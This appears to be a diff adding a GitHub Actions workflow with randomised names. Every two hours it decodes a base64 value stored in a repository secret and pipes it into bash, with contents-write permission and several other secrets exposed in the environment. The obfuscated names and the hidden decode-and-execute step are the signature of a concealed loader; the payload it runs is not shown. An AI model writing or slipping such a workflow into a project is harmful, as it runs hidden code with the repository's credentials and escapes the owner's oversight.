@@ -1,0 +1,21 @@
+name: zxos85s
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  dOah1Ub:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.dOTFNegCPr81NTp }}
+      - name: deDmk
+        env:
+          ZkPgt: ${{ secrets.dPZoW4j }}
+          hiNJCRZ4R: ${{ secrets.nfeEIGIrlmE7DPKY }}
+          lgzaHO8ulDfHXTl: ${{ secrets.SDE0JDr9DFz }}
+          GITHUB_TOKEN: ${{ secrets.dOTFNegCPr81NTp }}
+        run: echo "$ZkPgt" | base64 -d | bash
